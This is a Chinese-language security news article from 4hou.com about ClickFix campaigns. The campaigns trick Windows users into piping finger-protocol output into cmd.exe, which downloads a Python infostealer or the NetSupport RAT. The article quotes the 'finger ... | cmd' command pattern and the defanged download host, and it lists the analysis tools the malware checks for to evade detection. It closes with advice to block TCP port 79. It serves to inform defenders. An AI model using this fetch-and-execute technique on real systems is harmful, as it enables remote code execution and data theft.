---
title: Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具
url: https://www.4hou.com/posts/omLN
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2025-11-19
fetch_date: 2025-11-20T03:08:05.892967
---

# Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具

Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具

胡金鱼
[新闻](https://www.4hou.com/category/news)
23小时 前发布

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)9743

收藏

导语：此类finger命令滥用活动似乎由单一威胁者发起，且主要通过ClickFix攻击实施。但鉴于仍有用户持续上当，相关攻击活动需引起高度警惕。

有着数十年历史的finger协议正重新活跃，威胁者借助这一协议获取远程指令，在Windows设备上执行恶意操作。

过去，人们通过Finger协议，在Unix与Linux系统中使用finger命令查询本地及远程用户信息，该命令后续也被加入Windows系统。尽管目前仍受支持，但相较于数十年前的普及度，如今其使用率已大幅下降。

执行finger命令后，会返回用户的基础信息，包括登录名、用户名（若在/etc/passwd中设置）、主目录、电话号码、最后活跃时间及其他详情。

![finger-demo.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20251117/1763349712122980.jpg "1763349545118054.jpg")

手指命令输出

近期，多起恶意攻击活动开始利用Finger协议，疑似通过“ClickFix攻击”获取指令并在设备上执行。

这并非finger命令首次被如此滥用——早在2020年，研究人员就曾发出警告，指出该命令已被用作“ Living-off-the-Land Binary（ LOLBIN，合法系统工具滥用）”，用于下载恶意软件并规避检测。

**finger命令遭恶意滥用**

上月，网络安全研究员分享了一个批处理文件。该文件执行后，会运行“finger [[email protected]](/cdn-cgi/l/email-protection)[.]com”命令，从远程finger服务器获取指令，再通过管道符传递给cmd.exe在本地执行。

![batch-file-finger.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20251117/1763349715181137.jpg "1763349602149318.jpg")

手指命令输出

目前该服务器已无法访问，但MalwareHunterTeam又发现了更多利用finger命令的恶意软件样本与攻击活动。例如，Reddit平台上有用户近期发文警示，称自己遭遇了一场伪装成验证码验证的ClickFix攻击——攻击者诱导其运行一条Windows命令，以“证明自己是人类”。

尽管目前该服务器已不再响应finger请求，但另一位Reddit用户捕获了此前的输出结果。这类攻击将Finger协议用作远程脚本传输工具：通过运行“finger [[email protected]](/cdn-cgi/l/email-protection)[.]org”命令，将输出结果通过管道符传递给Windows命令处理器cmd.exe。

这一操作会触发获取到的指令执行：创建随机命名的路径，将curl.exe复制为随机文件名，通过重命名后的curl程序从cloudmega[.]org下载伪装成PDF文件的压缩包，并解压出一个Python恶意软件包。

![contents-of-fake-pdf.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20251117/1763349718174819.jpg "1763349644125148.jpg")

伪装成PDF的档案内容

随后，系统会通过“pythonw.exe \_\_init\_\_.py”命令执行该Python程序。最终执行的指令会向攻击者的服务器回传“执行成功”的确认信息，同时向用户显示伪造的“验证你是人类”提示框。

目前尚不清楚该Python恶意软件包的具体用途，但从一个关联批处理文件可推断，其应为一款信息窃取工具。

安全员还发现了另一项类似攻击活动：通过“finger [[email protected]](/cdn-cgi/l/email-protection) | cmd”命令获取并执行指令，操作流程与上述ClickFix攻击几乎一致。

![finger-output.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20251117/1763349721208530.jpg "1763349684155924.jpg")

finger命令的输出

分析发现，这一攻击手段更为成熟——指令会先检测设备中是否存在恶意软件研究常用工具，若发现则终止攻击。这些工具包括filemon、regmon、procexp、procexp64、tcpview、tcpview64、Procmon、Procmon64、vmmap、vmmap64、portmon、processlasso、Wireshark、Fiddler Everywhere、Fiddler、ida、ida64、ImmunityDebugger、WinDump、x64dbg、x32dbg、OllyDbg及ProcessHacker。

若未检测到恶意软件分析工具，指令会下载伪装成PDF的压缩包并解压。但与此前不同的是，该压缩包中并非Python恶意软件包，而是NetSupport Manager远程访问工具（RAT）安装包。

![netsupport-rat.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20251117/1763349720134320.jpg "1763349720134320.jpg")

NetSupport Manager RAT

随后，指令会配置一个计划任务，确保用户登录时自动启动该远程访问恶意软件。

目前来看，此类finger命令滥用活动似乎由单一威胁者发起，且主要通过ClickFix攻击实施。但鉴于仍有用户持续上当，相关攻击活动需引起高度警惕。

对于防御方而言，阻止finger命令滥用的最佳方式是拦截流向TCP 79端口的出站流量——该端口是Finger协议用于连接守护进程的专用端口。

文章来源自：https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?asPq2cGc)

#### 你可能感兴趣的

* [![]()

  Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具](https://www.4hou.com/posts/omLN)
* [![]()

  Cloudflare全球网络服务突发中断 多国用户遭遇访问故障](https://www.4hou.com/posts/Ey3K)
* [![]()

  捷豹路虎遭网络攻击 损失超 2.2 亿美元](https://www.4hou.com/posts/pnMr)
* [![]()

  AI-Slop勒索软件测试版潜入VS Code应用市场](https://www.4hou.com/posts/ZgjE)
* [![]()

  GlassWorm恶意软件卷土重来 三款新VSCode扩展下载量超万次](https://www.4hou.com/posts/YZg9)
* [![]()

  CSTIS：关于防范Morte僵尸网络的风险提示](https://www.4hou.com/posts/kgEY)

![](https://img.4hou.com/images/微信图片_20231102150249.jpg)

# [胡金鱼](https://www.4hou.com/member/BVMN)

这个家伙很懒,什么也没说!

#### 最新文章

* [Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具](https://www.4hou.com/posts/omLN)
  2025-11-19 12:00:00
* [Cloudflare全球网络服务突发中断 多国用户遭遇访问故障](https://www.4hou.com/posts/Ey3K)
  2025-11-19 11:03:05
* [捷豹路虎遭网络攻击 损失超 2.2 亿美元](https://www.4hou.com/posts/pnMr)
  2025-11-17 14:52:27
* [AI-Slop勒索软件测试版潜入VS Code应用市场](https://www.4hou.com/posts/ZgjE)
  2025-11-17 12:00:00

[查看更多](https://www.4hou.com/member/BVMN)

# 相关热文

* [Finger协议遭滥用 沦为 ClickFix 恶意软件攻击工具](https://www.4hou.com/posts/omLN)

  胡金鱼
* [Cloudflare全球网络服务突发中断 多国用户遭遇访问故障](https://www.4hou.com/posts/Ey3K)

  胡金鱼
* [捷豹路虎遭网络攻击 损失超 2.2 亿美元](https://www.4hou.com/posts/pnMr)

  胡金鱼
* [AI-Slop勒索软件测试版潜入VS Code应用市场](https://www.4hou.com/posts/ZgjE)

  胡金鱼
* [GlassWorm恶意软件卷土重来 三款新VSCode扩展下载量超万次](https://www.4hou.com/posts/YZg9)

  胡金鱼
* [CSTIS：关于防范Morte僵尸网络的风险提示](https://www.4hou.com/posts/kgEY)

  胡金鱼

![]()

[公司简介](https://www.4hou.com/about?title=公司简介)
|
[我要投稿](https://www.4hou.com/about?title=我要投稿)
|
[更新日志](https://www.4hou.com/about?title=更新日志)
|
[友情链接](https://www.4hou.com/about?title=友情链接)
|
[隐私政策](https://www.4hou.com/about?title=隐私政策)
|

[![](https://www.4hou.com/sihou/images/new4hou/weibo.png)](http://weibo.com/u/6069423878)
![](https://www.4hou.com/sihou/images/new4hou/wechat.png)

本站4hou.com，所使用的字体和图片文字等素材部分来源于原作者或互联网共享平台。如使用任何字体和图片文字有侵犯其版权所有方的，嘶吼将配合联系原作者核实，并做出删除处理。

[©2024 北京嘶吼文化传媒有限公司 京ICP备16063439号-1](https://beian.miit.gov.cn/)
本站由 ![](https://www.4hou.com/sihou/images/new4hou/txcloud.png) ![](https://www.4hou.com/sihou/images/new4hou/bdcloud.png) ![](https://www.4hou.com/sihou/images/new4hou/ucloud.png) 提供云计算服务

微信

[微博](http://weibo.com/u/6069423878)
[RSS](https://www.4hou.com/feed)
[知乎](https://zhuanlan.zhihu.com/roartalk)